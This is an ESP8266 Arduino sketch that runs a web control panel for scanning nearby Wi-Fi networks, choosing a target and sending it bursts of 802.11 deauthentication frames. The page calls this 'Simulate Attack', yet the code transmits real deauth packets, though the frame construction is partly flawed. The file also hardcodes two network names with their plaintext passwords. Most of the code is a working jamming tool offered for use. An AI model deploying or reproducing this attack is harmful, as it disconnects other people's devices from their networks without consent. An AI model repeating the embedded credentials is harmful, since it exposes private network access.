// Librairies Imports
#include <ESP8266WiFi.h>
extern "C" {
  #include "user_interface.h" // Required for deauth in v2.7.4
}

// Constants
// List of predefined Wi-Fi networks
const char* wifiList[][2] = {
  {"gnet2021", "71237274"},
  {"TOPNET_3BD8", "n8rajeb8yy"}
};

WiFiServer server(80);

//? bich n7asnou fil LOOP delay 
unsigned long lastClientTime = 0;
const unsigned long CLIENT_COOLDOWN = 10; //ms

void setup() {
  Serial.begin(115200);
  WiFi.setAutoReconnect(true);

  // Scan for available networks
  Serial.println("Scanning for Wi-Fi networks...");
  int numNetworks = WiFi.scanNetworks();
  if (numNetworks == 0) {
    Serial.println("No networks found.");
  } else {
    Serial.println("Networks found:");
    for (int i = 0; i < numNetworks; i++) {
      Serial.println(WiFi.SSID(i));
    }

    // Check if any predefined network is available
    for (int i = 0; i < numNetworks; i++) {
      for (unsigned int j = 0; j < sizeof(wifiList) / sizeof(wifiList[0]); j++) {
        if (strcmp(WiFi.SSID(i).c_str(), wifiList[j][0]) == 0) {
          Serial.print("Connecting to ");
          Serial.println(wifiList[j][0]);

          WiFi.begin(wifiList[j][0], wifiList[j][1]);
          unsigned long startTime = millis();
          while (WiFi.status() != WL_CONNECTED && millis() - startTime < 10000) {
            delay(500);
            Serial.print(".");
            if (WiFi.status() == WL_CONNECT_FAILED) {
              Serial.println("\nConnection failed! Check credentials.");
              break;
            }
          }

          if (WiFi.status() != WL_CONNECTED) {
            Serial.println("\nFailed to connect. Skipping...");
            WiFi.disconnect();
            delay(100);
            continue;
          }

          Serial.println("\nConnected!");
          Serial.print("IP Address: ");
          Serial.println(WiFi.localIP());
          server.begin();
          return;
        }
      }
    }
    Serial.println("No predefined networks found.");
  }
}

void loop() {
  if (millis() - lastClientTime < CLIENT_COOLDOWN) {
    return;
  }

  //? Changed from server.accept() to server.available() for v2.7.4
  ////WiFiClient client = server.accept():
  WiFiClient client = server.available();
  lastClientTime = millis();

  //* Client Error Handling 
  if (!client) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("WiFi connection lost, attempting reconnect...");
      WiFi.disconnect();
      WiFi.begin(wifiList[0][0], wifiList[0][1]); // Try first network
      delay(1000);
    }
    return;
  }

  if (client.connected()) {
    Serial.println("Request received.");
    String request = client.readStringUntil('\r');
    Serial.println(request);

    if (request.indexOf("GET / ") >= 0) {
      if (ESP.getFreeHeap() < 4096) {
        client.println("HTTP/1.1 500 Low Memory");
        client.println("Connection: close");
        client.println();
        return;
      }
      
      String html = "<html><body>";
      html += "<h1>ESP8266 Control Panel</h1>";
      html += "<p><a href='/scan'>Scan Network</a></p>";
      html += "<p><a href='/select'>Select Target</a></p>";
      html += "<p><a href='/attack'>Simulate Attack</a></p>";
      html += "</body></html>";
      
      // Replaced sendHTTPHeaders with direct implementation
      client.println("HTTP/1.1 200 OK");
      client.println("Content-Type: text/html");
      client.println("Connection: close");
      client.println("Content-Length: " + String(html.length()));
      client.println();
      client.println(html);
      Serial.println("Served main page.");
    } 
    else if (request.indexOf("GET /scan") >= 0) {
      String scanResults = "Network Scan Results:\n";
      int numNetworks = WiFi.scanNetworks();
      if (numNetworks == 0) {
        scanResults += "No networks found.\n";
      } else {
        scanResults += "Found " + String(numNetworks) + " networks:\n";
        for (int i = 0; i < numNetworks; i++) {
          scanResults += String(i + 1) + ": " + WiFi.SSID(i) + " (" + WiFi.RSSI(i) + " dBm)";
          scanResults += (WiFi.encryptionType(i) == ENC_TYPE_NONE) ? " [Open]\n" : " [Secured]\n";
        }
      }
      client.println("HTTP/1.1 200 OK");
      client.println("Content-Type: text/plain");
      client.println("Connection: close");
      client.println("Content-Length: " + String(scanResults.length()));
      client.println();
      client.println(scanResults);
    } 
    else if (request.indexOf("GET /select") >= 0) {
      String targetSelection = "Select a target device:<br>";
      int numNetworks = WiFi.scanNetworks();
      if (numNetworks == 0) {
        targetSelection += "No networks available to select.<br>";
      } else {
        for (int i = 0; i < numNetworks; i++) {
          targetSelection += "<a href='/attack?target=" + WiFi.BSSIDstr(i) + "'>Attack " + WiFi.SSID(i) + "</a><br>";
        }
      }
      client.println("HTTP/1.1 200 OK");
      client.println("Content-Type: text/html");
      client.println("Connection: close");
      client.println("Content-Length: " + String(targetSelection.length()));
      client.println();
      client.println(targetSelection);
    } 
    else if (request.indexOf("GET /attack?target=") >= 0) {
      String targetBSSID = request.substring(request.indexOf("target=") + 7);
      targetBSSID.trim();

      if (targetBSSID.length() == 17) {
        client.println("HTTP/1.1 200 OK");
        client.println("Content-Type: text/html");
        client.println("Connection: close");
        client.println();
        client.println("<html><body>");
        client.println("<h1>Attacking " + targetBSSID + "</h1>");
        client.println("<p>Sending deauth packets...</p>");
        client.println("</body></html>");

        deauthAttack(targetBSSID);
        Serial.println("Deauth attack sent to: " + targetBSSID);
      } else {
        client.println("HTTP/1.1 400 Bad Request");
        client.println("Content-Type: text/plain");
        client.println();
        client.println("Invalid MAC address.");
      }
    } 
    else {
      client.println("HTTP/1.1 404 Not Found");
      client.println("Content-Type: text/plain");
      client.println("Connection: close");
      client.println();
      client.println("404 - Not Found");
    }
    
    client.stop();
  }
}

// Function to simulate a deauthentication attack
void deauthAttack(String targetBSSID) {
  Serial.println("Starting deauthentication attack...");
  
  // MODIFIED FOR v2.7.4 COMPATIBILITY
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);
  wifi_set_channel(1);

  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC (replace with targetBSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00 // Reason code (1 = Unspecified)
  };

  sscanf(targetBSSID.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
         &deauthPacket[10], &deauthPacket[11], &deauthPacket[12],
         &deauthPacket[13], &deauthPacket[14], &deauthPacket[15]);

  for (int i = 0; i < 20; i++) {
    if (!wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0)) {
      Serial.println("Packet send failed!");
      break;
    }
    delay(1); // Faster attack
  }
  
  wifi_promiscuous_enable(0);
  WiFi.reconnect();
  Serial.println("Deauthentication attack complete.");
}